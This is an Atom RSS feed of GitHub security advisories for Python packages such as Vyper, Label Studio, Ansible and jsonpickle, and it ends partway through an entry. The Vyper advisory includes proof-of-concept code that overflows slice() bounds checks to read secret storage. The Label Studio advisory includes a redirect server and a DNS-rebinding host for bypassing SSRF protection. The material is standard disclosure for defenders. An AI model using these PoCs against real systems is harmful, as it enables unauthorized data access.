<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-02-02T12:01:30.723Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[lief] LIEF heap-buffer-overflow]]></title>
        <id>https://github.com/advisories/GHSA-22x7-vwh9-5w4g</id>
        <link href="https://github.com/advisories/GHSA-22x7-vwh9-5w4g"/>
        <updated>2024-02-01T21:22:04.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in LIEF through 0.11.0. A heap-buffer-overflow exists in the function main located in <code>pe_reader.c</code>. It allows an attacker to cause code Execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32297">https://nvd.nist.gov/vuln/detail/CVE-2021-32297</a></li>
<li><a href="https://github.com/lief-project/LIEF/issues/449">https://github.com/lief-project/LIEF/issues/449</a></li>
<li><a href="https://github.com/lief-project/LIEF/commit/19e06755e8ce1ecf136360a5c36cded3701ac253">https://github.com/lief-project/LIEF/commit/19e06755e8ce1ecf136360a5c36cded3701ac253</a></li>
<li><a href="https://github.com/advisories/GHSA-22x7-vwh9-5w4g">https://github.com/advisories/GHSA-22x7-vwh9-5w4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22x7-vwh9-5w4g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T19:15:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scikit-learn] scikit-learn Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-jxfp-4rvq-9h9m</id>
        <link href="https://github.com/advisories/GHSA-jxfp-4rvq-9h9m"/>
        <updated>2024-02-01T20:59:17.000Z</updated>
        <content type="html"><![CDATA[<p>svm_predict_values in svm.cpp in Libsvm v324, as used in scikit-learn 0.23.2 and other products, allows attackers to cause a denial of service (segmentation fault) via a crafted model SVM (introduced via pickle, json, or any other model permanence standard) with a large value in the _n_support array.
NOTE: the scikit-learn vendor's position is that the behavior can only occur if the library's API is violated by an application that changes a private attribute.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28975">https://nvd.nist.gov/vuln/detail/CVE-2020-28975</a></li>
<li><a href="https://github.com/scikit-learn/scikit-learn/issues/18891">https://github.com/scikit-learn/scikit-learn/issues/18891</a></li>
<li><a href="https://github.com/cjlin1/libsvm/blob/9a3a9708926dec87d382c43b203f2ca19c2d56a0/svm.cpp#L2501">https://github.com/cjlin1/libsvm/blob/9a3a9708926dec87d382c43b203f2ca19c2d56a0/svm.cpp#L2501</a></li>
<li><a href="http://packetstormsecurity.com/files/160281/SciKit-Learn-0.23.2-Denial-Of-Service.html">http://packetstormsecurity.com/files/160281/SciKit-Learn-0.23.2-Denial-Of-Service.html</a></li>
<li><a href="http://seclists.org/fulldisclosure/2020/Nov/44">http://seclists.org/fulldisclosure/2020/Nov/44</a></li>
<li><a href="https://github.com/scikit-learn/scikit-learn/commit/1bf13d567d3cd74854aa8343fd25b61dd768bb85">https://github.com/scikit-learn/scikit-learn/commit/1bf13d567d3cd74854aa8343fd25b61dd768bb85</a></li>
<li><a href="https://security.gentoo.org/glsa/202301-03">https://security.gentoo.org/glsa/202301-03</a></li>
<li><a href="https://github.com/advisories/GHSA-jxfp-4rvq-9h9m">https://github.com/advisories/GHSA-jxfp-4rvq-9h9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jxfp-4rvq-9h9m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T17:34:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonpickle] jsonpickle unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-j66q-qmrc-89rx</id>
        <link href="https://github.com/advisories/GHSA-j66q-qmrc-89rx"/>
        <updated>2024-02-01T20:58:41.000Z</updated>
        <content type="html"><![CDATA[<p>jsonpickle through 1.4.1 allows remote code execution during deserialization of a malicious payload through the <code>decode()</code> function. This CVE is disputed by the project author as intended functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-22083">https://nvd.nist.gov/vuln/detail/CVE-2020-22083</a></li>
<li><a href="https://github.com/jsonpickle/jsonpickle/issues/332">https://github.com/jsonpickle/jsonpickle/issues/332</a></li>
<li><a href="https://github.com/jsonpickle/jsonpickle/issues/332#issuecomment-747807494">https://github.com/jsonpickle/jsonpickle/issues/332#issuecomment-747807494</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2020-22083">https://access.redhat.com/security/cve/CVE-2020-22083</a></li>
<li><a href="https://gist.github.com/j0lt-github/bb543e77a1a10c33cb56cf23d0837874">https://gist.github.com/j0lt-github/bb543e77a1a10c33cb56cf23d0837874</a></li>
<li><a href="https://github.com/j0lt-github/python-deserialization-attack-payload-generator">https://github.com/j0lt-github/python-deserialization-attack-payload-generator</a></li>
<li><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/</a></li>
<li><a href="https://github.com/jsonpickle/jsonpickle/issues/335">https://github.com/jsonpickle/jsonpickle/issues/335</a></li>
<li><a href="https://github.com/advisories/GHSA-j66q-qmrc-89rx">https://github.com/advisories/GHSA-j66q-qmrc-89rx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j66q-qmrc-89rx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T17:36:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado XSRF cookie allows side-channel attack against TLS (BREACH attack)]]></title>
        <id>https://github.com/advisories/GHSA-8vpw-mgpf-mpvv</id>
        <link href="https://github.com/advisories/GHSA-8vpw-mgpf-mpvv"/>
        <updated>2024-02-01T20:53:46.000Z</updated>
        <content type="html"><![CDATA[<p>Tornado before 3.2.2 sends arbitrary responses that contain a fixed CSRF token and may be sent with HTTP compression, which makes it easier for remote attackers to conduct a BREACH attack and determine this token via a series of crafted requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-9720">https://nvd.nist.gov/vuln/detail/CVE-2014-9720</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/1c36307463b1e8affae100bf9386948e6c1b2308">https://github.com/tornadoweb/tornado/commit/1c36307463b1e8affae100bf9386948e6c1b2308</a></li>
<li><a href="https://bugzilla.novell.com/show_bug.cgi?id=930362">https://bugzilla.novell.com/show_bug.cgi?id=930362</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1222816">https://bugzilla.redhat.com/show_bug.cgi?id=1222816</a></li>
<li><a href="http://openwall.com/lists/oss-security/2015/05/19/4">http://openwall.com/lists/oss-security/2015/05/19/4</a></li>
<li><a href="http://www.tornadoweb.org/en/stable/releases/v3.2.2.html">http://www.tornadoweb.org/en/stable/releases/v3.2.2.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8vpw-mgpf-mpvv">https://github.com/advisories/GHSA-8vpw-mgpf-mpvv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8vpw-mgpf-mpvv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T19:57:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's bounds check on built-in `slice()` function can be overflowed]]></title>
        <id>https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</id>
        <link href="https://github.com/advisories/GHSA-9x7f-gwxq-6f2c"/>
        <updated>2024-02-01T20:51:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><a href="https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457">The bounds check for slices</a> does not account for the ability for <code>start + length</code> to overflow when the values aren't literals. </p>
<p>If a <code>slice()</code> function uses a non-literal argument for the <code>start</code>  or <code>length</code> variable, this creates the ability for an attacker to overflow the bounds check. </p>
<p>This issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the <code>length</code> slot of the respective array.</p>
<p>A contract search was performed and no vulnerable contracts were found in production.</p>
<p>tracking in issue <a href="https://github.com/vyperlang/vyper/issues/3756">https://github.com/vyperlang/vyper/issues/3756</a>.</p>
<h2 id="details">Details</h2>
<p>Here the flow for <code>storage</code> is supposed, but it is generalizable also for the other locations.</p>
<p>When calling <code>slice()</code> on a storage value, there are compile time bounds checks if the <code>start</code> and <code>length</code> values are literals, but of course this cannot happen if they are passed values:</p>
<pre><code class="language-python">if not is_adhoc_slice:
    if length_literal is not None:
        if length_literal &lt; 1:
            raise ArgumentException("Length cannot be less than 1", length_expr)

        if length_literal &gt; arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", length_expr)

    if start_literal is not None:
        if start_literal &gt; arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", start_expr)
        if length_literal is not None and start_literal + length_literal &gt; arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", node)
</code></pre>
<p>At runtime, we perform the following equivalent check, but the runtime check does not account for overflows:</p>
<pre><code class="language-python">["assert", ["le", ["add", start, length], src_len]],  # bounds check
</code></pre>
<p>The storage <code>slice()</code> function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the <code>start</code>  or <code>length</code> value, they can force an overflow and access an unrelated storage slot.</p>
<p>In most cases, this will mean they have the ability to forcibly return <code>0</code> for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.</p>
<h2 id="poc-oob-access">POC: OOB access</h2>
<p>For simplicity, take the following Vyper contract, which takes an argument to determine where in a <code>Bytes[64]</code> bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.</p>
<pre><code class="language-python"># @version ^0.3.9

x: public(Bytes[64])
secret: uint256

@external
def __init__():
    self.x = empty(Bytes[64])
    self.secret = 42

@external
def slice_it(start: uint256) -&gt; Bytes[64]:
    return slice(self.x, start, 64)
</code></pre>
<p>We can use the following manual storage to demonstrate the vulnerability:</p>
<pre><code class="language-json">{"x": {"type": "bytes32", "slot": 0}, "secret": {"type": "uint256", "slot": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}
</code></pre>
<p>If we run the following test, passing <code>max - 63</code> as the <code>start</code> value, we will overflow the bounds check, but access the storage slot at <code>1 + (2**256 - 63) / 32</code>, which is what was set in the above storage layout:</p>
<pre><code class="language-solidity">function test__slice_error() public {
    c = SuperContract(deployer.deploy_with_custom_storage("src/loose/", "slice_error", "slice_error_storage"));
    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63
    console.logBytes(result);
}
</code></pre>
<p>The result is that we return the secret value from storage:</p>
<pre><code>Logs:
0x0000...00002a
</code></pre>
<h2 id="poc-length-corruption">POC: <code>length</code> corruption</h2>
<p><code>OOG</code> exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the <code>length</code> slot is set with the original input value.</p>
<pre><code class="language-python">d: public(Bytes[256])
    
@external
def test():
    x : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1
    self.d = b"\x01\x02\x03\x04\x05\x06"
    # s : Bytes[256] = slice(self.d, 1, x)
    assert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935
</code></pre>
<p>The corruption of <code>length</code> can be then used to read dirty memory:</p>
<pre><code class="language-python">@external
def test():
    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1
    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232
    z: uint96 = 1
    if True:
        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]
    s :String[32] = slice(uint2str(z), 1, x)	# uint2str(z) == "1"
    #print(len(s))
    assert slice(s, 1, 2) == "22"
</code></pre>
<h2 id="impact">Impact</h2>
<p>The built-in <code>slice()</code> method can be used for OOB accesses or the corruption of the <code>length</code> slot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c">https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24561">https://nvd.nist.gov/vuln/detail/CVE-2024-24561</a></li>
<li><a href="https://github.com/vyperlang/vyper/issues/3756">https://github.com/vyperlang/vyper/issues/3756</a></li>
<li><a href="https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457">https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457</a></li>
<li><a href="https://github.com/advisories/GHSA-9x7f-gwxq-6f2c">https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-02-01T20:51:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] OctoPrint Unverified Password Change via Access Control Settings]]></title>
        <id>https://github.com/advisories/GHSA-5626-pw9c-hmjr</id>
        <link href="https://github.com/advisories/GHSA-5626-pw9c-hmjr"/>
        <updated>2024-01-31T20:25:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious admins to change the password of other admin accounts, including their own, without having to repeat their password.</p>
<p>An attacker who managed to hijack an admin account might use this to lock out actual admins from their OctoPrint instance.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability will be patched in version 1.10.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>OctoPrint administrators are strongly advised to thoroughly vet who has admin access to their installation.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Timothy "TK" Ruppert.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-5626-pw9c-hmjr">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-5626-pw9c-hmjr</a></li>
<li><a href="https://github.com/OctoPrint/OctoPrint/commit/1729d167b4ae4a5835bbc7211b92c6828b1c4125">https://github.com/OctoPrint/OctoPrint/commit/1729d167b4ae4a5835bbc7211b92c6828b1c4125</a></li>
<li><a href="https://github.com/OctoPrint/OctoPrint/releases/tag/1.10.0rc1">https://github.com/OctoPrint/OctoPrint/releases/tag/1.10.0rc1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23637">https://nvd.nist.gov/vuln/detail/CVE-2024-23637</a></li>
<li><a href="https://github.com/advisories/GHSA-5626-pw9c-hmjr">https://github.com/advisories/GHSA-5626-pw9c-hmjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5626-pw9c-hmjr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T18:04:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio SSRF on Import Bypassing `SSRF_PROTECTION_ENABLED` Protections]]></title>
        <id>https://github.com/advisories/GHSA-p59w-9gqw-wj8r</id>
        <link href="https://github.com/advisories/GHSA-p59w-9gqw-wj8r"/>
        <updated>2024-01-31T20:25:34.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.11.0"><code>1.11.0</code></a> and was tested on version <code>1.8.2</code>.</p>
<h1 id="overview">Overview</h1>
<p>Label Studio's SSRF protections that can be enabled by setting the <code>SSRF_PROTECTION_ENABLED</code> environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a <a href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS rebinding attack</a>.</p>
<h1 id="description">Description</h1>
<p>The following <code>tasks_from_url</code> method in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155"><code>label_studio/data_import/uploader.py</code></a> performs the SSRF validation (<code>validate_upload_url</code>) before sending the request.</p>
<pre><code class="language-python">def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):
    """Download file using URL and read tasks from it"""
    # process URL with tasks
    try:
        filename = url.rsplit('/', 1)[-1]

        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)
        # Reason for #nosec: url has been validated as SSRF safe by the
        # validation check above.
        response = requests.get(
            url, verify=False, headers={'Accept-Encoding': None}
        )  # nosec
        file_content = response.content
        check_tasks_max_file_size(int(response.headers['content-length']))
        file_upload = create_file_upload(
            user, project, SimpleUploadedFile(filename, file_content)
        )
        if file_upload.format_could_be_tasks_list:
            could_be_tasks_list = True
        file_upload_ids.append(file_upload.id)
        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(
            project, file_upload_ids
        )

    except ValidationError as e:
        raise e
    except Exception as e:
        raise ValidationError(str(e))
    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list
</code></pre>
<p>The <code>validate_upload_url</code> code in <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209"><code>label_studio/core/utils/io.py</code></a> is shown below.</p>
<pre><code class="language-python">def validate_upload_url(url, block_local_urls=True):
    """Utility function for defending against SSRF attacks. Raises
        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled
          and the URL resolves to a local address.
        - LabelStudioApiException if the hostname cannot be resolved

    :param url: Url to be checked for validity/safety,
    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.
    """

    parsed_url = parse_url(url)

    if parsed_url.scheme not in ('http', 'https'):
        raise InvalidUploadUrlError

    domain = parsed_url.host
    try:
        ip = socket.gethostbyname(domain)
    except socket.error:
        from core.utils.exceptions import LabelStudioAPIException
        raise LabelStudioAPIException(f"Can't resolve hostname {domain}")

    if not block_local_urls:
        return

    if ip == '0.0.0.0':  # nosec
        raise InvalidUploadUrlError
    local_subnets = [
        '127.0.0.0/8',
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
    ]
    for subnet in local_subnets:
        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):
            raise InvalidUploadUrlError
</code></pre>
<p>The issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Both the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.</p>
<h3 id="http-redirection">HTTP Redirection</h3>
<p>The python <code>requests</code> module automatically follows HTTP redirects (eg. response code <code>301</code> and <code>302</code>). Therefore, an attacker could use a URL shortener (eg. <code>https://www.shorturl.at/</code>) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.</p>
<pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(301)
        # skip first slash
        self.send_header('Location', self.path[1:])
        self.end_headers()

HTTPServer(("", 8080), RedirectHandler).serve_forever()
</code></pre>
<h3 id="dns-rebinding-attack">DNS Rebinding Attack</h3>
<p>DNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain <code>7f000001.030d1fd6.rbndr.us</code> will randomly switch between the IP address <code>3.13.31.214</code> that is not blocked to <code>127.0.0.1</code> which is not allowed.</p>
<h1 id="impact">Impact</h1>
<p>SSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<ul>
<li>Before saving any responses, validate the destination IP address is not in the deny list.</li>
<li>Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.</li>
</ul>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-p59w-9gqw-wj8r">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-p59w-9gqw-wj8r</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/55dd6af4716b92f2bb213fe461d1ffbc380c6a64">https://github.com/HumanSignal/label-studio/commit/55dd6af4716b92f2bb213fe461d1ffbc380c6a64</a></li>
<li><a href="https://en.wikipedia.org/wiki/DNS_rebinding">https://en.wikipedia.org/wiki/DNS_rebinding</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/releases/tag/1.11.0">https://github.com/HumanSignal/label-studio/releases/tag/1.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47116">https://nvd.nist.gov/vuln/detail/CVE-2023-47116</a></li>
<li><a href="https://github.com/advisories/GHSA-p59w-9gqw-wj8r">https://github.com/advisories/GHSA-p59w-9gqw-wj8r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p59w-9gqw-wj8r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T18:04:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible sets unsafe permissions for sources.list]]></title>
        <id>https://github.com/advisories/GHSA-6667-f46p-pg88</id>
        <link href="https://github.com/advisories/GHSA-6667-f46p-pg88"/>
        <updated>2024-01-31T00:03:36.000Z</updated>
        <content type="html"><![CDATA[<p>Ansible before 1.5.5 sets 0644 permissions for <code>sources.list</code>, which might allow local users to obtain sensitive credential information in opportunistic circumstances by reading a file that uses the <code>&amp;quot;deb http://user:pass@server:port/&amp;quot;</code> format.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-4659">https://nvd.nist.gov/vuln/detail/CVE-2014-4659</a></li>
<li><a href="https://github.com/ansible/ansible/blob/release1.5.5/CHANGELOG.md">https://github.com/ansible/ansible/blob/release1.5.5/CHANGELOG.md</a></li>
<li><a href="https://github.com/ansible/ansible/commit/a0e027fe362fbc209dbeff2f72d6e95f39885c69">https://github.com/ansible/ansible/commit/a0e027fe362fbc209dbeff2f72d6e95f39885c69</a></li>
<li><a href="https://web.archive.org/web/20200229060001/https://www.securityfocus.com/bid/68234">https://web.archive.org/web/20200229060001/https://www.securityfocus.com/bid/68234</a></li>
<li><a href="https://github.com/advisories/GHSA-6667-f46p-pg88">https://github.com/advisories/GHSA-6667-f46p-pg88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6667-f46p-pg88</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T19:57:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-wqq5-c89p-3wc3</id>
        <link href="https://github.com/advisories/GHSA-wqq5-c89p-3wc3"/>
        <updated>2024-01-30T23:56:01.000Z</updated>
        <content type="html"><![CDATA[<p>Ansible before 1.6.7 does not prevent inventory data with "{{" and "lookup" substrings, and does not prevent remote data with "{{" substrings, which allows remote attackers to execute arbitrary code via (1) crafted lookup('pipe') calls or (2) crafted Jinja2 data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-4966">https://nvd.nist.gov/vuln/detail/CVE-2014-4966</a></li>
<li><a href="https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527">https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527</a></li>
<li><a href="http://www.ocert.org/advisories/ocert-2014-004.html">http://www.ocert.org/advisories/ocert-2014-004.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wqq5-c89p-3wc3">https://github.com/advisories/GHSA-wqq5-c89p-3wc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wqq5-c89p-3wc3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T19:57:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-64cw-m57j-65xj</id>
        <link href="https://github.com/advisories/GHSA-64cw-m57j-65xj"/>
        <updated>2024-01-30T23:55:58.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple argument injection vulnerabilities in Ansible before 1.6.7 allow remote attackers to execute arbitrary code by leveraging access to an Ansible managed host and providing a crafted fact, as demonstrated by a fact with (1) a trailing " src=" clause, (2) a trailing " temp=" clause, or (3) a trailing " validate=" clause accompanied by a shell command.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-4967">https://nvd.nist.gov/vuln/detail/CVE-2014-4967</a></li>
<li><a href="https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527">https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527</a></li>
<li><a href="http://www.ocert.org/advisories/ocert-2014-004.html">http://www.ocert.org/advisories/ocert-2014-004.html</a></li>
<li><a href="https://github.com/advisories/GHSA-64cw-m57j-65xj">https://github.com/advisories/GHSA-64cw-m57j-65xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64cw-m57j-65xj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T19:57:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] vantage6 may create unencrypted tasks in encrypted collaboration]]></title>
        <id>https://github.com/advisories/GHSA-rjmv-52mp-gjrr</id>
        <link href="https://github.com/advisories/GHSA-rjmv-52mp-gjrr"/>
        <updated>2024-01-30T20:56:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There are no checks on whether the input is encrypted if a task is created in an encrypted collaboration. Therefore, a user may accidentally create a task with sensitive input data that will then be stored unencrypted in a database.</p>
<h3 id="workarounds">Workarounds</h3>
<p>This is not an issue with the normal workflow, only if e.g. a user with the python client sets encryption to the wrong value.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-rjmv-52mp-gjrr">https://github.com/vantage6/vantage6/security/advisories/GHSA-rjmv-52mp-gjrr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22193">https://nvd.nist.gov/vuln/detail/CVE-2024-22193</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/6383283733b81abfcacfec7538dc4dc882e98074">https://github.com/vantage6/vantage6/commit/6383283733b81abfcacfec7538dc4dc882e98074</a></li>
<li><a href="https://github.com/advisories/GHSA-rjmv-52mp-gjrr">https://github.com/advisories/GHSA-rjmv-52mp-gjrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rjmv-52mp-gjrr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-30T20:56:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] vantage6 has insecure SSH configuration for node and server containers]]></title>
        <id>https://github.com/advisories/GHSA-2wgc-48g2-cj5w</id>
        <link href="https://github.com/advisories/GHSA-2wgc-48g2-cj5w"/>
        <updated>2024-01-30T20:56:50.000Z</updated>
